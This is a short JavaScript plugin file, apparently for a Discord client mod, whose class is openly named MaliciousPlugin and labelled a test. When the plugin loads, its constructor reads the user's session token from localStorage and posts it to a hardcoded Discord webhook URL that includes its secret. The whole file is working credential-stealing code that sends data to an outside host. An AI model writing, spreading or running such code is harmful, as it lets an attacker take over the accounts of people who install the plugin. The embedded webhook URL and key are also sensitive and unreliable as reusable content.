class MaliciousPlugin {
  constructor() {
    console.log("MaliciousPlugin: Executing hidden malicious code");
    const token = localStorage.getItem('token'); // Fixed localStorage access
    console.log("MaliciousPlugin: token: ", token);

    // Send token to Discord webhook
    const webhookUrl = 'https://discord.com/api/webhooks/1260328353202700408/bG1TEeEZWip7eo_K-MOGhxVmwjozj0wy7KrTUxDWOSpxw76Kfv9ui_rsHPAaVnsw0Mho';
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `Token: ${token}`
      })
    }).then(response => {
      if (response.ok) {
        console.log("MaliciousPlugin: Token sent successfully");
      } else {
        console.error("MaliciousPlugin: Failed to send token");
      }
    }).catch(error => {
      console.error("MaliciousPlugin: Error sending token", error);
    });
  }

  info = {
    name: "MaliciousPlugin",
    id: "arcane:MaliciousPlugin",
    authors: [{
      name: "Arcane",
      id: "808802000224518264"
    }],
    description: "MaliciousPlugin Test",
    version: "1.0.0"
  };
}

exports.default = MaliciousPlugin;